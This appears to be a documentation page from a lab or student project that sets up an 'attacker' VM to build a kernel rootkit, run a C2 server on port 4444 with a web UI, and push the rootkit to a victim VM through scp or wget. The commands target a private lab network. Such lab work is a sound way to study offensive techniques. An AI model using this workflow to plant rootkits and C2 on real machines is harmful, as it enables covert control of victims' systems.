---
title: "Attacker VM Setup"
description: "Configure the attacking VM with C2 server and web interface"
icon: "terminal"
date: "2025-05-07T00:44:31+01:00"
lastmod: "2025-05-25T00:00:00+01:00"
draft: false
toc: true
weight: 203
---



## Prerequisites

1. **Host setup**: [Host Environment Setup]({{< relref "environment.md" >}})
2. **VM disk**: `attacker.qcow2` in `/var/lib/libvirt/images/`
3. **VM launched**: `sudo ./scripts/run_vms.sh attacker`


## VM Access

- **IP**: 192.168.200.11 (static)
- **Credentials**: `attacker` / `jules` (auto-login)

## Setup Method

{{< tabs tabTotal="2" >}}

{{% tab tabName="Pre-built (Recommended)" %}}

### Quick Start

Everything is pre-configured. Build and run immediately:

```bash
# Inside attacker VM (auto-logged in)
cd epirootkit

# Build rootkit + Start C2 server + Web UI
cd .. && ./deploy_c2.sh
# ✅ Builds rootkit automatically
# ✅ C2 server: port 4444
# ✅ Web interface: port 3000
```

**Access**: `http://192.168.200.11:3000` from host browser or `http://localhost:3000` from attacker VM browser

{{% /tab %}}

{{% tab tabName="Fresh VM Setup" %}}

### Prerequisites on the VM

The setup requires the `setup_attacker.sh` script. You have two options to obtain it:

**Option 1: Get it from the host with python (recommended)**

```bash
# In the scripts/ directory on the host
python3 -m http.server 8080
```
Then on the attacker VM:

```bash
wget http://192.168.200.1:8080/setup_attacker.sh
chmod +x setup_attacker.sh
```



**Option 2: Download from GitHub Gist**

```bash
wget https://gist.githubusercontent.com/KazeTachinuu/397da3d739384de9e592a2e6f26b7cc0/raw/0895738fbf9dccc16dd6fe1139eb206ec9024076/setup_attacker.sh
chmod +x setup_attacker.sh

```


### Setup

**1. Install Dependencies (inside VM):**
```bash
./setup_attacker.sh
```
This installs:

- Node.js 18.x LTS
- Build tools (gcc, make, linux-headers-$(uname -r), python3)
- SSH server


**2. Deploy Project (from host):**
```bash
./scripts/deploy_project.sh
# ✅ Transfers all project files via SSH
```

**3. Auto Build and Start (inside VM):**
```bash
cd epirootkit && ./deploy_c2.sh
# ✅ Builds rootkit automatically
# ✅ Installs C2 dependencies  
# ✅ Starts C2 server + Web UI
```

**Access**: `http://192.168.200.11:3000` from host browser or `http://localhost:3000` from attacker VM browser


{{% /tab %}}

{{< /tabs >}}

#### Deploy to Victim

Transfer rootkit to victim VM:

```bash
# Option A: SCP
# SCP is like cp (copy) but with SSH
scp rootkit/epirootkit.ko rootkit/deploy_rootkit.sh victim@192.168.200.10:~/

# Option B: HTTP server
cd rootkit && python3 -m http.server 8080
# Victim: wget http://192.168.200.11:8080/{epirootkit.ko,deploy_rootkit.sh}

# Option C: Web UI file transfer
```

## Configuration

### Attacker VM Role
- **Builds rootkit**: Compiles `epirootkit.ko` for victim
- **C2 server**: Port 4444 (client connections)
- **Web interface**: Port 3000 (operator access)
- **File transfer**: Deploys payload to victim

### Network
- **Attacker IP**: `192.168.200.11`
- **C2 port**: `4444` (default)
- **Web UI**: `http://192.168.200.11:3000`

## Next Steps

1. **[Victim Setup]({{< relref "victim-vm-setup.md" >}})**: Deploy rootkit
2. **Monitor**: Watch for client connections
3. **Control**: Use CLI or Web UI
